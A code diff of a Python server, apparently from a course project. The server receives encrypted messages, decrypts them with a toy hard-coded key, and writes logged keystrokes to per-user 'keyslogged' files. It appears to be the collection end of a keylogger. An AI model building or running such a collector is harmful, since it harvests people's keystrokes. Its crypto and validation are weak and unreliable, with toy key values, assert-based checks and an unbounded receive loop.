@@ -9,7 +9,6 @@ https://github.com/acdalal/cs331-gopher/blob/main/gopherServer.py
 
 import sys, socket, os
 from Crypto.Cipher import AES
-from Crypto.Hash import HMAC, SHA256
 from Crypto.Random import get_random_bytes
 
 DEFAULT_PORT = 48939
@@ -21,13 +20,15 @@ SERVER_d = 7871
 KEYS_FILE = "server-keyslogged.txt"
 CONFIG_FILE = "server_config"
 
+MIN_AES_KEY_LEN = 16
+
 
 def decodeKey(encodedKey):
 	'''
 	Turns the bytes into a string, into a list of strings, into a list
 	of ints which make up the encrypted key
 	'''
-
+	
 	keyString = encodedKey.decode("utf-8")
 
 	keyStrList = keyString.split(" ")
@@ -58,6 +59,9 @@ def decryptKey(keyList):
 		plaintext.append(decrypted)
 
 	aes_key = bytes(plaintext)
+
+	assert(len(aes_key) == MIN_AES_KEY_LEN)
+
 	return aes_key
 
 
@@ -96,6 +100,26 @@ def writeKeysToFile(keys, filename):
 		pass
 
 
+def deformatMessage(received):
+	'''
+	Input a byte message that is not delimitated, return three things:
+	encrypted aes_key, encrypted messages (keys + username), true if success
+	'''
+	if len(received) < 16:
+		return None, None, False
+
+	keyLength = received[0]
+
+	if keyLength < MIN_AES_KEY_LEN or len(received) < keyLength+2:
+		return None, None, False
+
+	encryptedKey = received[1:keyLength+1]
+
+	encryptedMsg = received[keyLength+1:]
+
+	return encryptedKey, encryptedMsg, True
+
+
 def listen(serverSocket):
 	'''
 	Upon receiving a connection, get the messages. A successful transaction 
@@ -115,7 +139,7 @@ def listen(serverSocket):
 		except:
 			print("Connection received from unknown host!")
 
-		data = []
+		data = bytes()
 
 		while True:
 			try: 
@@ -123,30 +147,32 @@ def listen(serverSocket):
 			except:
 				break
 
+			print("Received message of length:", len(msg))
 			if not len(msg):
 				break
 
-			data.append(msg)
+			data += msg
 
-			print("Received message of length:", len(msg))
+			# have check for if data is really long then stop doing this because don't want to be
+			# ddos'd or slow lorried by someone sending lots of data! 
 
 		try:
-			if len(data) < 2:
+			key, encryptedMsg, ok = deformatMessage(data)
+
+			if not ok:
 				continue
 
-			key = data[0]
 			decodedKey = decodeKey(key)
 			aes_key = decryptKey(decodedKey)
 
-			encryptedMsg = data[1]
 			msg = decryptMessage(encryptedMsg, aes_key)
-
 			username = ""
 
-			if len(data) >= 3:
-				encryptedUser = data[2]
-				username = decryptMessage(encryptedUser, aes_key)
-		
+			msgList = msg.split("\n")
+			if len(msgList) > 1:
+				msg = msgList[0]
+				username = msgList[1]
+
 			writeKeysToFile(msg, username + KEYS_FILE)
 		except Exception as e:
 			print(e)
